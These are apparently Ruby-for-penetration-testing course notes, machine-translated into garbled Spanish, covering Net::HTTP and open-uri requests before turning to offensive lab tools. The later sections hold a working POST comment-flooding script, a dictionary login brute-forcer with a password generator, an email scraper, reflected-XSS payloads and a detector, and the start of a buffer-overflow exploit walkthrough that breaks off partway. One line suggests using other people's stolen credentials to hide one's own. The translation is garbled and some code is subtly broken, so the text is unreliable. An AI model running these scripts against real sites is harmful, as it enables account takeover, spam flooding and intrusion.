→ http://ruby-doc.org/stdlib-1.9.3/libdoc/open-uri/rdoc/OpenURI.html

Para obtener la misma salida corporal:

```ruby
require('open-uri')
open('http://localhost/') do |http|
  puts http.read
end
```

Por lo general, se utiliza open-uri cuando tienes que recuperar la respuesta del cuerpo de un servidor web rápidamente.

#### URI object

* URI es un módulo que proporciona clases para manejar los identificadores de recursos uniformes. su utilizado para encapsular una URL (URL es un subconjunto de URI)

→ http://www.ruby-doc.org/stdlib-1.9.3/libdoc/uri/rdoc/URI.html

```ruby
lhost_url = URI("http://localhost")
// now we can use 'lhost_url' with 'open-uri'
open(lhost_url) do |http|
puts http.read
end
```

También podemos usar lhosturl con **Net::HTTP**:

```ruby
puts Net::HTTP.get(lhost_url)
```

### Net::HTTP class and instances

→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#method-c-get

#### GET

* El primer verbo que queremos analizar es 'GET'
* Tomaremos sobre manejadores, parámetros y demás.

**Net::HTTP get**

* hemos visto que el método de clase Net::HTTP get se puede utilizar para obtener la porción corporal de la respuesta HTTP de un objetivo como cadena.

Envía una solicitud de GET al objetivo que se puede especificar utilizando:

```ruby
an URI object parameter
host, path and port parameters
```

Ejemplo:

```ruby
resp = Net::HTTP.get(URI("http://www.elearnsecurity.com"))
# we obtain the GET response body in string format
```

Para imprimir el cuerpo de respuesta directamente a stdout usamos get-print:

```ruby
Net::HTTP.get_print(URI("http://www.elearnsecurity.com"))
```

Podemos evitar usar el objeto URI a favor del huésco y los parámetros de la ruta:

```ruby
resp = Net::HTTP.get("www.elearnsecurity.com","/")
```

Ejemplo de get-print con parámetros de host y ruta:

```ruby
Net::HTTP.get_print("www.example.com","/index.html")
```

* podemos. use **::** or **.** para llamar a un método de clase

Ejemplo:

```ruby
Net::HTTP::get_print(URI("http://localhost/"))
Net::HTTP.get_print(URI("http://localhost/"))
```

**Net::HTTP get\_response**

* En este caso, no tenemos una cuerda como resultado.

Tenemos un objeto HTTPResponse que encapsula la respuesta HTTP (toda la respuesta, no sólo el cuerpo):

```ruby
res_obj = Net::HTTP.get_response(URI("http://localhost/"))
```

**HttpResponse object**

* esta clase envuelve la cabecera de respuesta y el cuerpo de respuesta juntos.

Es la superclase del objeto de respuesta real devuelto por get-response:

```ruby
res_obj = Net::HTTP.get_response(URI("http://localhost/"))
```

→ http://www.ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#class-Net::HTTP-label-HTTP+Response+Classes

Situación:

```ruby
res_obj.code
# Output: "200"
res_obj.message
# Output: "OK"
res_obj.class.name
# Output: "Net::HTTPOK"

```

Cabeceros: Para conseguir el hash de las cabeceras:

```ruby
res_obj.to_hash
```

También podemos usar cada uno de ellos:

```ruby
res_obj.each { |key,value| print key,":  ",value,"\n"}
```

Para obtener una cabecera en particular:

```ruby
res_obj["content-type"]
# Output: "text/html"

res_obj["server"]
# Output: "Microsoft-IIS/7.5"
```

* con las cabeceras podemos obtener información sobre el servidor Por ejemplo, pero a veces los expertos en seguridad web cambian este valor de encabezado (con los falsos) con el fin de ocultar el software y la versión del servidor real.

Body:

```ruby
print res_obj.body
```

**Response Object types**

Si un recurso no existe, tenemos un objeto **404** y un objeto de subclase **HTTPNotFound**:

```ruby
res_obj.class.name
# Output: "Net::HTTPNotFound"

res_obj.code
# Output: "404"
```

Si el recurso solicitado se ha movido permanentemente entonces tenemos un código **301** y un objeto de subclase **HTTPMovedPermanently**:

```ruby
res_obj.class.name
# Output: "Net::HTTPMovedPermanently"

res_obj.code
# Output: "301"
```

En la respuesta de forma permanente moved, el encabezado de ubicación especifica dónde encontrar el recurso:

```ruby
res_obj['location']
```

**Parameters**

\*\* Las solicitudes de GET\*\* también pueden tener parámetros. La parte de la URL que contiene parámetros de datos se llama cadena de consulta.

→ https://hack.me/

* este proyecto permite iniciar una aplicación web vulnerable donde u puede probar su script sin violar ninguna ley
* it looks like hack.me is offline, donc je suis perdu

**URL encapsulation**

Primero realizar un GET usando toda la URL que contiene la cadena de consulta:

```ruby
target = 'http://<full url>'
res = Net::HTTP.get(URI(target))
```

Coma un chequeo \*\*\*\* con la respuesta que esperamos:

```ruby
res =~/You have searched For: hello/
# Output: 2057
# the string is at position 2057
```

**Dynamic parameters**

* Una instancia de URI puede encapsular una cadena URL completa. podemos recuperar y configurar todos los campos de URL mediante el uso de la getter y setter proporcionado por la clase URI.

→ moreover: http://www.ruby-doc.org/stdlib-2.1.0/libdoc/uri/rdoc/URI.html

```ruby
url = URI(target)
url.host # 's20570-101060-xjo.tarentum.hack.me'
url.path # '/search.php'
```

Dado que la URL **target** no contiene una cadena de consulta, el objeto URL devuelve **nil** usando la búsqueda getter:

```ruby
url.query
# Output: nil
```

* Consulta el método es un setter también..

Podemos crearlos usando un hash simple (params) y luego podemos utilizar el método de utilidad **encode-www-form** para crear la cadena de consulta correcta:

```ruby
params = {:find=>"hello",:searching=>"yes"}
url.query = URI.encode_www_form(params)
# Output: "find=hello&searching=yes"
```

Ahora podemos realizar la solicitud \*_GET_ usando Net::HTTP get (open-uri se puede usar también):

```ruby
res = Net::HTTP.get(url)

res =~/You have searched For: hello/
# Output: '2057'
```

**Net::HTTP instances**

→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html

primero creamos Net::HTTP instancia y especificamos la direccion del target:

```ruby
http = Net::HTTP.new("www.elearnsecurity.com")
```

**Using GET instance method**

Tenemos que llamarlo especificando la ruta de recursos que queremos solicitar como argumento:

```ruby
res = http.get("/")
# in this example we request the home page
```

**Using Http:Get request object**

La biblioteca **net/http** proporciona una clase Para las solicitudes HTTP. su nombre completo es **Net::HttpRequest**, y al igual que HttpResponse, envuelve el encabezado de solicitud y el camino de solicitud juntos.

* Esta clase no se puede utilizar directamente; u tienes que elegir una de sus subclasas: Net:::HTTP::(Oblosión, Post, Cabecera)

→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#method-i-request

* De acuerdo con las referencias, u puede utilizar sus subclases instancias sólo utilizando el método de solicitud de Net::HTP instancias. // la ruta del recurso del servidor que queremos

The Net::Http::Get instance es una subclase de la HttpRequest diseñada para realizar solicitudes Get:

```ruby
http = Net::HTTP.new("www.elearnsecurity.com")
req = Net::HTTP::Get.new("/")
# after having both Net::HTTP and Net::HTTP:GET instances, we can use the request method.
res = http.request(req)
```

**URI and parameters**

Si u usa la instancia Net::HTTP para realizar solicitudes GET, u puede utilizar objetos URI como parámetros también.

**Request Headers**

* Cómo manejar las cabeceras de solicitud
* para establecer nuestra cabecera personalizada, tenemos que utilizar Net::HTTP instancias

**Using get instance method**

Cómo cambiar el valor predeterminado del cabezatector de pedido **Usuario-Agent**:

```ruby
http = Net::HTTP.new("www.elearnsecurity.com")
headers = {"user-agent" => "Custom user agent"}
http.get("/",headers)
# we can confirm with Wireshark, that our current User-Agent contains the value that we gave = "Custom user agent"
```

**using Http.Get request object**

→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTPHeader.html

HttpRequest instances wraps the request header (Net::HTTPHeader) and the request path together:

```ruby
http = Net::HTTP.new("www.elearnsecurity.com")
req = Net::HTTP::Get.new("/")
req['user-agent'] //only outputs the current user-agent
req['user-agent'] = "Another custom user-agent" # modify and print the user-agent

http.request(req)
# we can check with wireshark again that our new user-agent is set correctly
```

**Working with Open-uri**

GET Las solicitudes se pueden realizar más fácilmente mediante el uso de una biblioteca de auridos abiertos

* Open-uri sólo soporta el método GET pero hay gemas (como **rest-open-uri**) que extienden su funcionalidad a otros verbos (como POST)

**open method**

Devuelve un objeto de Tempfile que encapsula la respuesta:

```ruby
resp = open("http://www.elearnsecurity.com")
resp.class.name
# Output: "Tempfile"
```

Si quieres el cuerpo de respuesta, u puede usar unumerators de línea:

```ruby
resp.each_line { |line| puts line }
```

Los encabezados de respuesta se tratan como meta información y están disponibles usando el atributo **meta**:

```ruby
resp.meta
# headers output
```

U también puede utilizar abierto con una metodología de bloque. la variable de bloque (resp) es el desfile creado por el open:

```ruby
open("http://www.elearnsecurity.com"){ |resp| puts resp.meta }
```

**request headers**

Con **open** podemos especificar encabezados de solicitud como argumento de hash opcional:

```ruby
open("http://www.elearnsecurity.com",{"User-Agent"=>"custom header"})
```

Ajuste de la nueva cabecera:

```ruby
open("http://www.elearnsecurity.com","User-Agent"=>"Test","New-Header"=>"some value")
```

#### POST

**Using Net::HTTP post\_form**

→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#method-c-post\_form

La dirección de destino es el recurso de login.php, mientras que los parámetros de la forma son el usuario y pasan:

```ruby
url = URI("<url of the target>")
params = {"user"=>"els","pass"=>"els"}
res = Net::HTTP.post_form(url,params)
```

**Sessions and cookies**

```ruby
res['location']
```

> **myaccount.php** su cabecera de respuesta de ubicación con la dirección de destino si el login success

Para ver si el inicio de sesión con nuestro POST tuvo éxito. miramos el set-cookie:

```ruby
res.to_hash
```

Ahora enviamos una petición de GET al objetivo myaccount.php usando una cabecera de galletas adecuada:

```ruby
url = "<url/myaccount.php>"
logged = open(url,"cookie"=>res['set-cookie'])

logged.each_line { |line| print line }
# to print the response
```

**Using Http::Post request object**

Lo primero es crear una red::HTTP instance:

```ruby
target = "<url>"
http = Net::HTTP.new(target)
```

ahora creamos la instancia Net::HTTP::POST

```ruby
req = Net::HTTP::Post.new("/login.php")
```

Tenemos que establecer los valores de forma de POST, en este caso els:els

```ruby
req.set_form_data("user"=>"els","pass"=>"els")
```

Ahora tenemos que enviar la solicitud utilizando el método de la instancia Net::HTTP

```ruby
res = http.request(req)
# we received a 'moved temporarly' response
```

Para imprimir los encabezados, podemos ver la cabecera de set-cookie con el Departamento de Desarrollo, que identifica la sesión de loco:

```ruby
res.to_hash
```

> podemos utilizar este **SESSION-ID** como una petición Cookie para realizar solicitudes registradas

**Request Headers**

U puede establecer sus encabezados de solicitud personalizada con peticiones POST

* en la página registrada podemos escribir comentarios
* Podemos llevar a cabo la misma operación en Ruby.
* los comentarios sólo se permiten para iniciar sesión en los usuarios
* esto significa implícitamente que su navegador envía una cookie (como una cabecera) que identifica su sesión autenticada durante la petición de POST
* por lo tanto, tenemos que establecer la cabecera **cookie** con un valor de identificación adecuada.
* ver el código fuente para identificar el formulario **action** de la página y los nombres de campo
* en este caso, action='endmsg.confirmation.php', name, comment

Tenemos una variable **res** que contiene la respuesta de inicio de sesión con el SESIó-ID en el encabezado de set-cookie:

```ruby
res.to_hash
```

**Using post instance method**

Para usar \*\* post\*\*, necesitamos una Red::Http instance; la dirección de recursos objetivo también:

```ruby
target = "<url>"
http = Net::HTTP.new(target)
```

El formulario que queremos enviar si:

```ruby
param = {"name"=>"hello","comment"=>"from ruby","cat"=>"1"}
# the cat is if of the category
```

Nuestra petición \*\* post\*\* debe contener una cabecera de galletas con un documento válido de sesión-ID:

```ruby
header = {"cookie"=>res['set-cookie']}
```

* ahora podemos realizar la petición POST
* requiere un código de forma codificado, mientras que la ruta de destino es la dirección de acción vista antes en el código fuente.

```ruby
enc_param = URI.encode_www_form(param)
http.post("/sendmsg_confirmation.php",enc_param,header)

# we can go to the page and check if our commentary is there
```

**Using Http::Post request object**

```ruby
target = "<url>"
http = Net::HTTP.new(target)
req = Net::HTTP::Post.new("/sendmsg_confirmation.php")
req.set_form_data({"name"=>"hello","comment"=>"again from ruby","cat"=>"1"})
req['cookie']=res['set-cookie']
http.request(req)
```

**Example: Post Flooding**

Queremos escribir un script \*\* post inundando\*\* que envía la solicitud POST posterior al objetivo con el fin de completar la página de programas (program.php) con una gran cantidad de comentarios no deseados.

* esto es posible porque no se implementan mecanismos de seguridad en la aplicación web (como captcha). Por lo tanto, la solicitud posterior puede automatizarse mediante un script.
* nuestro script toma la dirección de destino, un nombre de usuario, una contraseña y el número de comentarios que queremos enviar como argumentos. entonces el script realiza el flujo de inicio de sesión y finalmente utiliza el SESION-ID recibido para enviar las solicitudes de comentarios POST posteriores.

Usage:

```ruby
ruby post_flooding.rb <target url> <login> <password> <number of comments>
```

Identará primero los parámetros y crea en la instancia http:

```ruby
require 'net/http'
Target_URI = URI(ARGV[0])
Username = ARGV[1]
Password = ARGV[2]
Max_Comments = ARGV[3].to_i

http = Net::HTTP.new(Target_URI.hostname)
```

Realmente el proceso de inicio de sesión utilizando Username y Contraseña para obtener el identificador de sesión del encabezado de respuesta de set-cookie:

```ruby
login_param = URI.encode_www_form({"user"=>Username, "pass"=>Password})
login_res = http.post("/login.php",login_param)
session_id = login_res['set-cookie']
```

Luego la parte de inundación. tenemos que utilizar el Departamento de identificación recibido del proceso de inicio de sesión como una cabecera de galletas para poder publicar cualquier comentario:

```ruby
flood_parameters = URI.encode_www_form({"name"=>"FLOOD","comment"=>"FROM RUBY","cat"=>"1"})
(1..Max_Comments).each{ 
  http.post("/sendmsg_confirmation.php",flood_parameters,"cookie"=>session_id
}
```

> Usamos nuestras propias credenciales, eso ahora es ideal podemos tratar de descubrir a alguien las credenciales de los elses para no exponer nuestras credenciales

#### Persistent Connections

Si tienes que intercambiar mucha información con el servidor (Por ejemplo, una descarga de archivos multi pedazo), es mejor tener una conexión TCP única.

* el protocolo HTTP 1.1 permite u mantener la conexión abierta Para posterior solicitud.
* usando el método **start**, podemos abrir una corriente TCP única (una conexión única y un apretón de manos único)

→ moreover: http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html

> Brute form login

**Response identification**

Wgallina en el inicio de sesión tiene éxito, el servidor envía una respuesta de **movida temporarly** que apunta a myaccount.php. El servidor también establece una cookie con la sesión de inicio de sesión de inicio de sesión creada:

```ruby
url = URI("<target login url>")
params = {"user"=>"els","pass"=>"els"}
res = Net::HTTP.post_form(url,params)
res['location']
res['set-cookie']
```

> si proporcionamos credenciales equivocadas, no hay encabezado de galleta y la ubicación es la misma url para que podamos usar estas 2 info, para ver si el login tiene éxito o no.

**Find a UserName**

Deseche a través de la página web para encontrar nombres de usuario válidos

* en este caso hay logins en los comentarios

**Dictionary attack**

El script prueba secuencialmente cada contraseña contra el mismo UserName y si uno de estos es correcto, la imprime a stdout.

Usage:

```ruby

→ time ruby dictionary_login.rb <url target> <username> <dictionary file>

require 'net/http'

Target = ARGV[0]
User = ARGV[1]
Password_file = ARGV[2]

url = URI(Target)
params = { "user" => User }
http = Net::HTTP.start(url.hostname)
req = Net::HTTP::Post.new(url.request_uri)

File.open(Password_file, 'r') do |file|
  real_pwd = file.each do |pwd|
    params['pass'] = pwd.chomp # Use `chomp` to remove newline characters
    req.set_form_data(params)
    res = http.request(req)
    break pwd.chomp if res['location'] == 'myaccount.php' && res['set-cookie']
  end

  if real_pwd.is_a? String
    puts "\nPassword for '#{User}' is: #{real_pwd}"
  else
    puts "\nPassword not found for '#{User}'."
  end
end

http.finish # Corrected the method name

```

**Using a string generator**

Si el objetivo elige una contraseña fuerte, es posible que un atacante no pueda descubrirla en poco tiempo

Sin embargo, es un buen ejercicio para utilizar Ruby para generar toda la cadena de espacio de entrada de caracteres particular para usar en un escenario de fuerza bruta real.

Parámetros de entrada:

```ruby
Input_space = 'a'..'z'
Min_length = 1
Max_length = 3
```

Genera todas las cuerdas de un tamaño específico utilizando los caracteres de entrada-espacio:

```ruby
def genst(st,post,&block)
  return block.call(st) if pos<=0
  Input_space.each { |x| genst(st+x,pos-1,&block) }
end
```

Comience de longitud hasta longitud máxima genera todas las cuerdas de un tamaño específico utilizando el más antiguo:

```ruby
def genallpwd(&block)
  (Min_length..Max_length).each { |l| genst("",l,&block)}
end
```

Llame al método genallpwd y nos permite especificar cuál es la tarea hacer cuando se genera una nueva cadena.

En este caso queremos imprimir:

```ruby
genallpwd{ |pwd| puts pwd}
```

> podemos cambiar el tamaño Por ejemplo, a 4,10 y también cambiar el espacio de entrada a cada cuerda alfanumérica

```ruby
Input_space = ('A'..'Z').to_a+('a'..'z').to_a+('0'..'9').to_a
Min_length = 4
Max_length = 10
```

> podemos establecer el objetivo url y el nombre de usuario como parámetros e intentar entrar en la cuenta con los caracteres generados toma algún tiempo utilizar esta técnica, incluso si su contraseña corta

#### HTTPS

Net::HTTP nos permite manejar también las conexiones https. Sólo tenemos que cambiar el establecimiento de conexión, el resto es el mismo

* create an SSL conexión con Net::HTTP instance

Specifixca a correcto SSL port (usually 443):

```ruby
url = URI("http://members.elearnsecurity.com")
url.host //the site
url.port //443
https = Net::HTTP.new(url.host,url.port)
```

Estala la conexión para usar SSL:

```ruby
https.use_ssl = true
```

Ahora podemos utilizar todos los métodos de instancia vistos anteriormente.

Por ejemplo, una simple solicitud de GET a la ruta de la página:

```ruby
resp = https.get("/")
```

Otra forma de manejar la conexión https es usando el método **start**:

```ruby
https = Net::HTTP.start(url.host,url.port,:use_ssl=>true)
```

→ moreover = http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html

#### Redirection

Un uso común es Por razones de seguridad - la típica redirección HTTP a HTTPS. Por ejemplo, si er solicitar una página de inicio de sesión del sitio web usando HTTP, podríamos ser redirecidos automáticamente a la página HTTPS.

* el script imprimirá la cadena de redirección a la salida estándar.
* por lo general, las respuestas son **Modved Permanently 301** o **Modved Temporarly 302**. en estos casos, el encabezado de ubicación especifica dónde se puede encontrar el recurso.

Si enviamos una solicitud **GET**, tenemos el mensaje y el encabezado de ubicación:

```ruby
res = Net::HTTP.get_response(URI("http://justcrypt.it"))
res['location']
# Output: 'https://justcryit.com'
```

Tenemos que seguir la petición.:

```ruby

url = URI("https://justcrypt.it")
resp = Net::HTTP.start(url.host,url.port,:use_ssl=>true) do |https|
  https.get("/")
end
resp['location']
# Output: 'https://justcrypt.it/send'

```

Tenemos que seguir la cadena de redirección hasta que recibamos una respuesta HTTPOK (código 200):

```ruby
url = URI("https://justcrypt.it/send")
resp = Net::HTTP.start(url.host,url.port,:use_ssl=>true) do |https|
  https.get(url.path)
end
# Output: 'HTTPOK 200 OK readbody=true'
```

**Follow the chain**

Podemos hacer un script a automáticamente que sigue la cadena de una dirección de destino dada

Primero la función que es capaz de seguir la cadena de redirección, puede identificar tanto el tipo de conexión http y https:

```ruby
require 'net/http'

Target = ARGV[0]

def follow_chain(url, &block)
  resp = Net::HTTP.start(url.host, url.port, use_ssl: url.scheme == 'https') do |https|
    https.get(url.path)
  end
  block.call(url, resp)
  follow_chain(URI(resp['location']), &block) if resp.is_a? Net::HTTPRedirection
end

puts "Starting from: #{Target}\n\n"
follow_chain(URI(Target)) do |url, resp|
  case resp
  when Net::HTTPRedirection
    puts "Redirection to: #{resp['location']}"
  when Net::HTTPSuccess
    puts "\nHTTPOK: #{url.to_s}"
  end
end


```

#### Proxies

Puede ser útil utilizar proxies (Por ejemplo, si quieres mantener tu anonimato)

→ list of free available proxies - http://www.freeproxylists.net/

* en este ejemplo vamos a utilizar proxy 62.68.95.14 en el puerto 8080 - HTTP

**Http Proxies**

primero crea a Net::HTTP instance:

```ruby
proxy_addr = "62.68.95.14"
proxy_port = 8080
proxy = Net::HTTP.new("www.elearnsecurity", nil,"proxy_addr,proxy_port")
```

Entonces podemos utilizar los métodos ya vistos para realizar una solicitud:

```ruby
res = proxy.get("/")
# Output: 'HTTPOK 200'
```

Podemos inspeccionar los paquetes con alambre de tiburones:

```ruby
nslookup www.elearnsecurity.com
```

**Https Proxies**

Elija un proxy que soporte conexiones https

Es lo mismo que http, pero tenemos que usar SSL:

```ruby
proxy_addr = "92.245.170.248"
proxy_port = 8080
target = "members.elearnsecurity.com"
res = Net::HTTP.start(target, 443,proxy_addr,proxy_port,:use_ssl=>true) do |https|
  https.get("/")
end

# Output: 'HTTPOK 200 ok'
```

* https proxies usan el túnel de CONNECT **HTTP**
* la clase Net::HTTP encapsule automáticamente este protocolo en particular cuando u solicite un recurso HTTPS usando un proxy

→ moreover = http://en.wikipedia.org/wiki/HTTP\_tunnel#HTTP\_CONNECT\_Tunneling

#### Other VERBS

Para usar otros verbos además de conseguir y publicar, utilizamos una instancia de Net::HTTP (no hay Net:::HTTP métodos de clase para hacer eso)

**Options**

OPTIONS las solicitudes permiten conocer la lista de VERBs apoyados por un recurso web objetivo particular

Start apache = service apache2 start

Mostrar los verbos disponibles:

```ruby
http = Net::HTTP.new("localhost")
opt = http.options("/")
opt.to_hash
# in the allow output ['options, get, head, post']
```

Podemos obtener el mismo resultado usando un objeto Net::HTP::Options request request. su subclase de HttpSolic:

```ruby
http = Net::HTTP.new("localhost")
req = Net::HTTP::Options.new("/")
opt = http.request(req)
opt.to_hash
```

A veces los verbos diferentes del post y get no están permitidos. Tomemos a Google como ejemplo:

```ruby
opt.class.name
# Output: "Net:HTTPMethodNotAllowed" // does not allowed the options verb
```

**HEAD**

Verbo solía solicitar sólo las cabeceras de respuesta de recursos:

```ruby
http = Net::HTTP.new("localhost")
head = http.head("/")
head.to_hash
headh.body
# Output: nil
```

U puede utilizar el objeto de solicitud de subclase HttpRequest **Net::HTTP::Head**:

```ruby
http = Net::HTTP.new("localhost")
req = Net::HTTP::Head.new("/")
head = http.request(req)
head.to_hash
```

**Others**

Compre el control las referencias

→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html

#### Data Extraction

La extracción de los datos depende del tipo de cuerpo de respuesta: HTML, XML, JSON, formato privado, etc.

Usaremos principalmente expresión regular o análisis de documentos

**Regular Expressions**

Sea cual sea el formato de respuesta, con expresión regular u puede extraer subcadeings que coin conformidad con un patrón específico (ignorando el formato)

**email extraction**

Si tienes que realizar un pene más que implica una aplicación web, extraer correos electrónicos es algo que u harías Usage:

```ruby
ruby email_extr.rb <url target>
```

El código que utiliza open-uri y método de escaneo:

```ruby
require 'open-uri'

Target = ARGV[0]
Email_re = /[-0-9a-zA-Z.+_]+@[-0-9a-zA-Z.+_]+\.[a-zA-Z]{2,4}/
emails = open(Target) { |res| res.read.scan(Email_re)}
emails.each { |email| puts email}
```

> U también puedes comprobar contenidos invisibles como comentarios o elementos ocultos

#### Document Parsing

A veces es mejor analizar la estructura de los nodos del documento

**Nokogiri**

→ http://nokogiri.org/

* Nokogiri es un parisco HTML, SAX y Reader. de búsqueda a través de los selectores de XPath o CSS3.

```ruby
- Xpath 
 → http://www.w3.org/TR/xpath/
 → https://www.w3schools.com/xml/xpath_intro.asp

- CSS3 selector:
 → http://www.w3.org/TR/selectors/
 → http://www.w3schools.com/cssref/css_selectors.asp
```

Installation:

```ruby
gem install nokogiri
```

Documentation & tutorials:

```ruby
- http://nokogiri.org/tutorials
```

Ejemplo: Form Extraction:

Uso:

```ruby

ruby form_extr.rb <url>

require 'open-uri'
require 'nokogiri'

Target = ARGV[0]

# Get the response body from the target resource via open-uri and parse the result HTML document using Nokogiri
doc = Nokogiri::HTML(open(Target))

# The xpath method returns an array of Nokogiri nodes
doc.xpath("//form").each_with_index do |form, i|
  puts "------- FORM #{i + 1} ---------- "
  puts "Action: " + form['action']
  puts "Method: " + form['method']
  puts "FIELD"
  form.xpath(".//input").each do |input|
    puts "Name: #{input['name']} - Type: #{input['type']}"
  end
  puts
end


```

Ejemplo 2 - Detectar XSS reflejado:

Algunos navegadores (es decir, cromo) tienen un filtro de xss reflejado incorporado que reconoce cargas útiles comunes tales como:

```ruby
<script>alert(1)</script>
```

> la manera más fácil es analizar el documento usando Nokogori para buscar la carga útil inyectada para ver cómo aparece en el árbol parsed.

w/ interpreter:

```ruby
require 'open-uri'
require 'nokogiri'
target = URI("<the full url with the <script> alert")
```

> podemos utilizar open-uri y nokogiri para solicitar el recurso objetivo utilizando una solicitud de GET y para analizar el cuerpo de respuesta html

```ruby

doc = Nokogiri::HTML(open(target))

If we have a 'script' node in the tree, it means that the browser parses it as a script node too and executes its code:
alert(12345)
# another strategy is to search the string alert(12345) and check if its contained in a script node
# nokogiri treats text as a TextNode that must be contained in some ElementNode
# in this case, the ElementNode must be a script node while the TextNode must contains the string 'alert(12345)'
```

* Con la consulta xpath, podemos buscar a través de todos los nodos de texto para encontrar el que contiene la alerta

Ejemplo:

```ruby
text()[contains(.,' alert(12345)')]
```

El texto se utiliza para seleccionar todos los nodos de texto de todo el documento html

Los corchetes se utilizan para extraer nodos que satisfacen una condición particular

Contiene es una función xpath que comprueba si una cadena en particular contiene otra cadena (primer argumento - segundo argumento)

* Por lo tanto, para cada texto = (. punto), se prueba si enfria el segundo argumento (alerta12345)

Podemos ejecutar la consulta a nuestro documento analizado usando la función xpath:

```ruby
doc.xpath("//text()[contains(.,' alert(12345)')]") 
```

// la salida será una serie de nodos que satisfacen nuestra consulta de xpath

Queremos probar si su padre es un nodo de guión:

```ruby
el = doc.xpath("//text()[contains(.,' alert(12345)')]") 
el.first
el.first.parent
el.first.parent.name
el.first.parent.to_html
```

Podemos ver también el código HTML del nodo que contiene el script inyectado:

```ruby
el.first.parent.parent.to_html
# so we can confirm the we have inject a real script that will be executed by any browser
```

**A simple Tool to detect XSS**

Uso:

```ruby
ruby detect_xss.rb <full url> <target parameter>

<div> <?php echo $_GET['param'] ?></div>
<div> <?php echp htmlspecialchars($_GET['param'],ENT_QUOTES, 'UTF-8') ?> </div>
```

// en el primer div el script se inyectó correctamente, pero en el segundo se filtró.

```ruby
→ ruby detect_xss.rb http://localhost/xss1.php?param=123 param


require 'nokogiri'
require 'open-uri'
require 'cgi'

Target = URI(ARGV[0])
Parameter = ARGV[1]

XSS_VECTORS = ["<script> alert(123456)</script>"]
Testing_Values = [" alert(123456)"]

Query = CGI.parse(Target.query)

XSS_VECTORS.zip(Testing_Values).each do |vect, test|
  Query[Parameter] = vect
  Target.query = URI.encode_www_form(Query)
  doc = Nokogiri::HTML(open(Target))

  doc.search("//text()[contains(.,'#{test}')]").each do |el|
    if el.parent.name == 'script'
      puts "------ Probable XSS found --------"
      puts "Injection Vector: #{vect}","\n"
      puts "FOUND IN THE FOLLOWING CODE"
      puts el.parent.parent.to_html
      puts "------------------------------------------","\n"
    end
  end
end

```

```ruby
Sometimes the simple <script> does not work, so we need to be more sophisticated

Example:

' onclick=alert(12345) b='
```

> in caso tenemos un código que no filtra las cotizaciones individuales

### Exercises

#### 1 - CMS Detection

* El primer ejercicio que podría hacer es detectar si una aplicación web en particular utiliza un CMS
* 1 vía - comprobar las cabeceras de respuesta de los recursos de la webapp para encontrar algunos valores interesantes (por ejemplo, cabeceras de respuesta de X-Powered-By)
* 2 caminos - prueba si las URL de los recursos de la aplicación web siguen un patrón en particular

#### 2 - Hidden Files

* Detector de archivos ocultos
* a veces, las devs web dejan copias de seguridad o archivos de configuración en la webapp
* archivos ocultos comunes que pueden dar información son web.config.bak o php.ini.back y así en
* el script podría leer este nombre de archivo en particular de una lista (un archivo Por ejemplo) y crear una solicitud GET al recurso de destino específico para comprobar si están disponibles

#### 3 - Indexing & Crawling

* desarrollar ur su propia cinta de rasgón web o herramienta de indexación
* comienzo de la página de inicio de una aplicación web y lista (y descargar si u está desarrollando un rasgador) todos los recursos que u puede encontrar en la página web.
* u puede tener que elegir la política de selección de páginas, restricción de URL, la estrategia para detectar si una página ya se ha arrastrado, etc.
* rasgados avanzados tienen en cuenta otros problemas como eficiencia, fallas (tiempos de espera, páginas restringidas, etc.), saturación de ancho de banda y así en.

#### 4 - Subdomain enumeration

* u puede utilizar algunas estrategias ya utilizadas Para gatear o archivos ocultos, pero u también puede los motores de búsqueda web (como google)

## Exploitation

```
ELS Echo Server

The Exploit
```

### ELS Echo Server

* es un simple servidor de eco que devuelve todos los mensajes que recibe
* disponible en la dirección 172.16.5.10 puerto 7707. ejecuta xp sp3

#### the service

```ruby
s = TCPSocket.new "172.16.5.10",7707
s.gets
# Output: 'els echo server 1.1'

s.puts "hello world"
s.gets
# Output: 'hello world - echo server'
```

Sólo se acerque al primer mensaje porque cierra la conexión tras la respuesta:

```ruby
s.puts "a message"
s.gets
# Output: 'a message - echo server'

s.puts "another message"
# Output: Errno::EPIPE: Broken pipe
```

#### Bug detection

* ataques comunes requieren mala programación
* en este caso, el servidor de eco tiene un error de programación común, el tamaño de los datos recibidos del usuario no se comprueba causando una posibilidad de desbordamiento de buffer

Ejemplo. permite enviar muchos datos al servidor:

```ruby
s = TCPSocket.new "172.16.5.10",7707
s.gets
s.puts "A"*100
```

> no recibimos una respuesta, podemos asumir que el servidor se estrelló

* la técnica más común para sobrescribir la dirección de retorno es usando una dirección de instrucciones ESP de LLLLLLS (generalmente ubicada en Kernel32.dll) y luego poner el código malicioso después del espacio de variables locales.
* Esto se mantiene porque ESP almacena la parte superior de la pila y cuando se ejecuta el RET, el marco de la copia de entrada se borra y la parte superior de la pila contiene nuestro código malicioso ejecutado a continuación por el CALL ESP.

Por lo tanto para explotar correctamente la vulnerabilidad, tenemos que detectar dónde insertar la dirección de LLLS y el PAYLOAD malicioso.

#### The Exploit

**Identify the Buffer Overflow space**

Tenemos que encontrar la posición de la dirección de retorno

**Fuzzing**

* es una técnica incremental para detectar la posición correcta de la dirección de retorno y su uso principalmente cuando no podemos depurar el servicio vulnerable.
* los hackers usan jozzers sólo si no pueden depurar la aplicación de destino por sí mismos.

Si u tiene acceso al ejecutable, u puede utilizar herramientas tales como:

```ruby
→ Immunity Debugger = https://www.immunityinc.com/products/debugger/
→ IDA pro = https://www.hex-rays.com/products/ida/
→ Ollydbg = http://www.ollydbg.de/
```

**Using a Debugger**

* permite usar Immunity Debugger
* establecer un punto de ruptura en la instrucción RETN de la función de input-copy. porque queremos comprobar el valor del registro EIP después de la devolución.

Para detectar dónde está la dirección de retorno (descomunmiento del amortiguador vulnerable), podemos utilizar dos herramientas de metástasis:

```ruby
pattern_create.rb
pattern_offset.rb
/usr/share/metasploit-framework/tools/exploit/
```

First we create a pattern:

```ruby
